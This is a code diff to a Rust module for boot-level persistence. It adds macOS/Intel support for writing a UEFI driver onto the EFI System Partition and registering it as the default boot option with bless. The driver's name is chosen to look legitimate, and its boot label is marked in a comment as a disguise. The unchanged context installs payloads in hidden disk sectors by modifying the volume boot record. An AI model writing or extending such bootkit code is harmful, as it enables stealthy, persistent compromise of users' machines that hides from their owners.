@@ -32,7 +32,7 @@
 //!
 //! # Feature Flag
 //!
-//! Gated by `hardware-persistence`.  Cross-platform (Linux and Windows).
+//! Gated by `hardware-persistence`.  Cross-platform (Linux, Windows, and macOS/Intel).
 
 use anyhow::{anyhow, bail, Context, Result};
 use serde::{Deserialize, Serialize};
@@ -141,7 +141,11 @@ pub fn check_bios_uefi_mode() -> Result<BootMode> {
     {
         check_boot_mode_windows()
     }
-    #[cfg(not(any(target_os = "linux", windows)))]
+    #[cfg(target_os = "macos")]
+    {
+        check_boot_mode_macos()
+    }
+    #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
     {
         Ok(BootMode::Unknown)
     }
@@ -240,6 +244,51 @@ fn check_boot_mode_windows() -> Result<BootMode> {
     Ok(BootMode::Uefi)
 }
 
+/// macOS: detect boot mode via system profiler.
+///
+/// Intel Macs use UEFI firmware; Apple Silicon Macs use iBoot.
+/// UEFI persistence only applies to Intel Macs.
+#[cfg(target_os = "macos")]
+fn check_boot_mode_macos() -> Result<BootMode> {
+    // Check the CPU architecture — Apple Silicon means iBoot, not UEFI.
+    let arch_output = std::process::Command::new("uname")
+        .arg("-m")
+        .output()
+        .context("failed to run uname -m")?;
+
+    let arch = String::from_utf8_lossy(&arch_output.stdout).trim().to_string();
+
+    if arch == "arm64" {
+        // Apple Silicon uses iBoot, not UEFI.  Standard UEFI NVRAM
+        // variables are not accessible; return Unknown to signal that
+        // UEFI-style persistence does not apply.
+        return Ok(BootMode::Unknown);
+    }
+
+    // Intel Mac (x86_64) — uses UEFI firmware.  Check if /usr/sbin/nvram
+    // can read EFI variables to confirm UEFI is active.
+    if !std::path::Path::new("/usr/sbin/nvram").exists() {
+        return Ok(BootMode::Unknown);
+    }
+
+    // Try to read a standard EFI global variable.
+    let nvram_output = std::process::Command::new("/usr/sbin/nvram")
+        .arg("8BE4DF61-93CA-11D2-AA0D-00E098032B8C:BootOrder")
+        .output();
+
+    if let Ok(out) = nvram_output {
+        if out.status.success() {
+            // Intel Mac with UEFI.  Secure Boot is not a standard feature on
+            // Intel Macs (there is no user-facing toggle), so we report Uefi.
+            return Ok(BootMode::Uefi);
+        }
+    }
+
+    // Could not confirm UEFI variables — still likely UEFI on Intel Mac,
+    // but be conservative.
+    Ok(BootMode::Uefi)
+}
+
 // ═══════════════════════════════════════════════════════════════════════════
 // §3  VBR (Volume Boot Record) Persistence — Legacy BIOS Only
 // ═══════════════════════════════════════════════════════════════════════════
@@ -334,7 +383,7 @@ pub fn install_vbr_persistence(payload_path: &str) -> Result<()> {
         hash: sha256_hex(&original_vbr),
     };
     let backup_path = save_vbr_backup(&backup)?;
-    log::info!("VBR backup saved to: {}", backup_path);
+    tracing::info!("VBR backup saved to: {}", backup_path);
 
     // Step 5: Build the modified VBR.
     let modified_vbr = build_modified_vbr(&original_vbr, payload.len())?;
@@ -349,7 +398,7 @@ pub fn install_vbr_persistence(payload_path: &str) -> Result<()> {
     let payload_start_lba = vbr_lba + 1;
     write_payload_to_sectors(&disk_path, payload_start_lba, &payload)?;
 
-    log::info!(
+    tracing::info!(
         "VBR persistence installed: payload ({} bytes) at LBA {}, VBR modified at LBA {}",
         payload.len(),
         payload_start_lba,
@@ -902,7 +951,7 @@ fn write_sector_verified(disk_path: &str, lba: u64, data: &[u8]) -> Result<()> {
         );
     }
 
-    log::info!("VBR write verified at LBA {}", lba);
+    tracing::info!("VBR write verified at LBA {}", lba);
     Ok(())
 }
 
@@ -968,7 +1017,7 @@ fn write_payload_to_sectors(disk_path: &str, start_lba: u64, payload: &[u8]) -> 
         write_sector_verified(disk_path, lba, sector_data)?;
     }
 
-    log::info!(
+    tracing::info!(
         "Payload written: {} bytes across {} sectors starting at LBA {}",
         payload.len(),
         num_sectors,
@@ -1062,7 +1111,7 @@ pub fn install_uefi_boot_persistence(driver_path: &str) -> Result<()> {
     }
     if driver_data[0] != 0x4D || driver_data[1] != 0x5A {
         // Not an MZ header — warn but proceed (some EFI drivers lack MZ).
-        log::warn!("Driver does not have MZ header — may not be a valid EFI PE/COFF binary");
+        tracing::warn!("Driver does not have MZ header — may not be a valid EFI PE/COFF binary");
     }
 
     // Step 2: Mount ESP and deploy driver.
@@ -1074,12 +1123,16 @@ pub fn install_uefi_boot_persistence(driver_path: &str) -> Result<()> {
     {
         install_uefi_driver_windows(&driver_data)?;
     }
-    #[cfg(not(any(target_os = "linux", windows)))]
+    #[cfg(target_os = "macos")]
+    {
+        install_uefi_driver_macos(&driver_data)?;
+    }
+    #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
     {
         bail!("UEFI driver installation not supported on this platform");
     }
 
-    #[cfg(any(target_os = "linux", windows))]
+    #[cfg(any(target_os = "linux", target_os = "macos", windows))]
     Ok(())
 }
 
@@ -1109,7 +1162,7 @@ fn install_uefi_driver_linux(driver_data: &[u8]) -> Result<()> {
         bail!("driver write verification failed");
     }
 
-    log::info!("UEFI driver written to: {}", driver_path);
+    tracing::info!("UEFI driver written to: {}", driver_path);
 
     // Add boot entry via efibootmgr.
     let esp_disk = find_esp_disk_linux()?;
@@ -1135,7 +1188,7 @@ fn install_uefi_driver_linux(driver_data: &[u8]) -> Result<()> {
         bail!("efibootmgr failed: {}", stderr.trim());
     }
 
-    log::info!("UEFI boot entry added successfully");
+    tracing::info!("UEFI boot entry added successfully");
     Ok(())
 }
 
@@ -1283,13 +1336,13 @@ fn install_uefi_driver_windows(driver_data: &[u8]) -> Result<()> {
 
     if !output.status.success() {
         let stderr = String::from_utf8_lossy(&output.stderr);
-        log::warn!(
+        tracing::warn!(
             "bcdedit /create failed (may need to run as SYSTEM): {}",
             stderr.trim()
         );
     }
 
-    log::info!("UEFI boot driver installed on Windows");
+    tracing::info!("UEFI boot driver installed on Windows");
     Ok(())
 }
 
@@ -1320,6 +1373,161 @@ fn find_esp_mount_windows() -> Result<String> {
     }
 
     bail!("cannot find EFI System Partition on Windows")
+}
+
+/// macOS: deploy UEFI driver via bless.
+///
+/// On Intel Macs, the ESP can be mounted with `diskutil mount`, the driver
+/// is written to the ESP, and `bless` is used to register it as a boot
+/// option.  Apple Silicon Macs should never reach this code path because
+/// `check_boot_mode_macos` returns `BootMode::Unknown` for arm64.
+#[cfg(target_os = "macos")]
+fn install_uefi_driver_macos(driver_data: &[u8]) -> Result<()> {
+    // Step 1: Mount the ESP.
+    let esp_mount = find_esp_mount_macos()?;
+
+    // Step 2: Choose a legitimate-looking driver name and write it.
+    let driver_name = "BootServicesDxe";
+    let driver_dir = format!("{}/EFI/Boot", esp_mount);
+    let driver_path = format!("{}/{}.efi", driver_dir, driver_name);
+
+    std::fs::create_dir_all(&driver_dir)
+        .with_context(|| format!("cannot create directory {}", driver_dir))?;
+
+    std::fs::write(&driver_path, driver_data)
+        .with_context(|| format!("cannot write driver to {}", driver_path))?;
+
+    // Verify the write.
+    let readback =
+        std::fs::read(&driver_path).with_context(|| "cannot read back driver for verification")?;
+    if readback != driver_data {
+        bail!("driver write verification failed");
+    }
+
+    tracing::info!("UEFI driver written to: {}", driver_path);
+
+    // Step 3: Use bless to register the driver as a boot option.
+    // `bless --efi` can set EFI boot entries on Intel Macs.
+    // We mount the device, get its device node, and bless the EFI binary.
+    let mount_device = find_esp_device_macos()?;
+
+    let output = std::process::Command::new("/usr/sbin/bless")
+        .args([
+            "--device",
+            &mount_device,
+            "--efi",
+            &format!("\\EFI\\Boot\\{}.efi", driver_name),
+            "--label",
+            "macOS Boot Services", // Disguise as legitimate
+            "--setBoot",
+        ])
+        .output()
+        .context("failed to run bless")?;
+
+    if !output.status.success() {
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        tracing::warn!(
+            "bless --setBoot failed (may need root): {}",
+            stderr.trim()
+        );
+        // Not a hard failure — the driver is on disk, bless just sets the
+        // active boot entry.  An operator can manually bless later.
+    }
+
+    tracing::info!("UEFI boot driver installed on macOS");
+    Ok(())
+}
+
+/// Find the ESP mount point on macOS.
+///
+/// Uses `diskutil` to locate and mount the EFI System Partition.
+#[cfg(target_os = "macos")]
+fn find_esp_mount_macos() -> Result<String> {
+    // Try common mount points first.
+    if Path::new("/Volumes/EFI").exists() {
+        return Ok("/Volumes/EFI".to_string());
+    }
+
+    // Use diskutil to find and mount the ESP.
+    // First, find the ESP device node.
+    let output = std::process::Command::new("diskutil")
+        .args(["list"])
+        .output()
+        .context("failed to run diskutil list")?;
+
+    if !output.status.success() {
+        bail!("diskutil list failed");
+    }
+
+    let text = String::from_utf8_lossy(&output.stdout);
+    let mut esp_identifier: Option<String> = None;
+
+    // Parse diskutil output to find "EFI" or "EFI System Partition" entry.
+    // Example line: "   0:      GUID_partition_scheme                        *500 GB   disk0"
+    //                "   1:                        EFI EFI System Partition     209 MB   disk0s1"
+    for line in text.lines() {
+        if line.contains("EFI") && line.contains("disk") {
+            // Extract the disk identifier (e.g. "disk0s1").
+            let parts: Vec<&str> = line.split_whitespace().collect();
+            if let Some(disk) = parts.last() {
+                if disk.starts_with("disk") {
+                    esp_identifier = Some(disk.to_string());
+                    break;
+                }
+            }
+        }
+    }
+
+    let esp_dev = esp_identifier.ok_or_else(|| anyhow!("cannot find EFI System Partition"))?;
+
+    // Mount the ESP.
+    let mount_output = std::process::Command::new("diskutil")
+        .args(["mount", &esp_dev])
+        .output()
+        .context("failed to run diskutil mount")?;
+
+    if !mount_output.status.success() {
+        let stderr = String::from_utf8_lossy(&mount_output.stderr);
+        bail!("diskutil mount {} failed: {}", esp_dev, stderr.trim());
+    }
+
+    // Parse mount point from diskutil output.
+    // Output format: "Volume EFI on /Volumes/EFI mounted"
+    let mount_text = String::from_utf8_lossy(&mount_output.stdout);
+    if let Some(mp) = mount_text.split("on ").nth(1).and_then(|s| s.split(' ').next()) {
+        return Ok(mp.to_string());
+    }
+
+    // Fallback: check /Volumes/EFI.
+    if Path::new("/Volumes/EFI").exists() {
+        return Ok("/Volumes/EFI".to_string());
+    }
+
+    bail!("cannot determine ESP mount point on macOS")
+}
+
+/// Find the ESP device node on macOS (e.g. "disk0s1").
+#[cfg(target_os = "macos")]
+fn find_esp_device_macos() -> Result<String> {
+    let output = std::process::Command::new("diskutil")
+        .args(["list"])
+        .output()
+        .context("failed to run diskutil list")?;
+
+    let text = String::from_utf8_lossy(&output.stdout);
+
+    for line in text.lines() {
+        if line.contains("EFI") && line.contains("disk") {
+            let parts: Vec<&str> = line.split_whitespace().collect();
+            if let Some(disk) = parts.last() {
+                if disk.starts_with("disk") {
+                    return Ok(disk.to_string());
+                }
+            }
+        }
+    }
+
+    bail!("cannot find ESP device node")
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -1703,7 +1911,7 @@ fn remove_vbr_modification(artifact: &PersistenceArtifact) -> Result<()> {
                                     backup.vbr_lba,
                                     &backup.original_vbr,
                                 )?;
-                                log::info!(
+                                tracing::info!(
                                     "Restored original VBR at LBA {} from backup",
                                     backup.vbr_lba
                                 );
@@ -1748,7 +1956,7 @@ fn remove_efi_boot_entry(artifact: &PersistenceArtifact) -> Result<()> {
             .context("failed to run efibootmgr")?;
 
         if output.status.success() {
-            log::info!("Removed EFI boot entry Boot{}", boot_num);
+            tracing::info!("Removed EFI boot entry Boot{}", boot_num);
             Ok(())
         } else {
             let stderr = String::from_utf8_lossy(&output.stderr);
@@ -1763,7 +1971,7 @@ fn remove_efi_boot_entry(artifact: &PersistenceArtifact) -> Result<()> {
             .context("failed to run bcdedit")?;
 
         if output.status.success() {
-            log::info!("Removed BCD entry {}", boot_num);
+            tracing::info!("Removed BCD entry {}", boot_num);
             Ok(())
         } else {
             let stderr = String::from_utf8_lossy(&output.stderr);
@@ -1788,7 +1996,7 @@ fn remove_uefi_driver(artifact: &PersistenceArtifact) -> Result<()> {
         std::fs::remove_file(path)
             .with_context(|| format!("cannot remove driver at {}", artifact.location))?;
 
-        log::info!(
+        tracing::info!(
             "Removed UEFI driver: {} (backup at {})",
             artifact.location,
             backup_path
@@ -1823,7 +2031,7 @@ fn remove_hidden_payload(artifact: &PersistenceArtifact) -> Result<()> {
     let zeros = vec![0u8; SECTOR_SIZE];
     write_sector_verified(disk_path, lba, &zeros)?;
 
-    log::info!("Zeroed hidden sector payload at {} LBA {}", disk_path, lba);
+    tracing::info!("Zeroed hidden sector payload at {} LBA {}", disk_path, lba);
     Ok(())
 }
 
